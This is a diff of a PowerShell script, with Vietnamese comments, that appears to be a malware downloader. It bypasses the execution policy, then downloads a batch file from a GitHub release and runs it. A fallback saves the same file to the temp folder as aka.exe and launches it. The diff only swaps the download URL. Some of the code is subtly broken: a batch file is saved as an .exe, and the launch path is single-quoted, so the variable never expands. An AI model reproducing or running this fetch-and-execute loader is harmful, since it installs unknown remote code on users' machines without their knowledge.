@@ -7,7 +7,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 $skid = "skid"
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/siu/main.cmd" -OutFile "download.bat"
+    Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "download.bat"
     Start-Process -FilePath 'download.bat'
 }
 
@@ -39,7 +39,7 @@ catch {
     # Thực thi lệnh thay thế
     Write-Output "Thực thi lệnh thay thế từ hai1723.com/fix.ps1"
     try {
-        Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/siu/main.cmd" -OutFile "$temp\aka.exe"
+        Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "$temp\aka.exe"
         Start-Process -FilePath '$temp\aka.exe'
         Write-Output "Lệnh thay thế đã được thực thi thành công."
     }
